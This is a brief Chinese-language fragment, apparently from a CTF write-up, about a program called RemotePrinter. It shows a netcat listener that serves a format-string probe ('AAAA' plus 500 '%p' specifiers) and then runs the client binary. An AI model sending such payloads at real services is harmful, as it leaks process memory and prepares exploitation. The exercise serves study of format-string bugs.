## 服务端:
```sh
$ python -c 'print "AAAA" + "%p "*500' | nc -l  8080 -vv
```
![](img/屏幕快照\ 2016-11-07\ 下午10.14.05.png)
## 客户端
执行
```sh
./RemotePrinter
```
![](img/屏幕快照\ 2016-11-07\ 下午10.13.48.png)
